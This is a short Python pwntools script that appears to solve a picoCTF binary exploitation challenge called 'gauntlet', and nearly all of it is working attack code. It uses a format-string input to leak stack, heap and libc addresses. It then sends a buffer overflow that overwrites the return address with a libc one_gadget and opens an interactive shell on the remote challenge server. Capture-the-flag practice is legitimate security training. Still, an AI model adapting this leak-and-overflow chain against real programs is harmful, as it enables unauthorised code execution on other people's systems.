#!/usr/bin/env python3

from pwn import *

exe = ELF("./gauntlet_patched")
libc = exe.libc

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, "break *main+149")
    else:
        r = remote("wily-courier.picoctf.net", 63706)

    return r


def main():
    r = conn()

    libc.sym["one_gadget"] = 0x10a2fc

    r.sendline(b"%20$lx--%21$lx--%23$lx")
    leaks = r.recvline().strip().split(b"--")

    stack = int(leaks[0], 16)
    heap = int(leaks[1], 16) - 0x260
    libc.address = int(leaks[2], 16) - (libc.sym.__libc_start_main + 231)

    log.info(f"stack @ 0x{stack:x}")
    log.info(f"heap  @ 0x{heap:x}")
    log.info(f"libc  @ 0x{libc.address:x}")
    
    # Loop program
    payload = flat(
        b"A" * 0x78,
        libc.sym["one_gadget"]
    )

    r.sendline(payload)
    r.interactive("$ ")


if __name__ == "__main__":
    main()
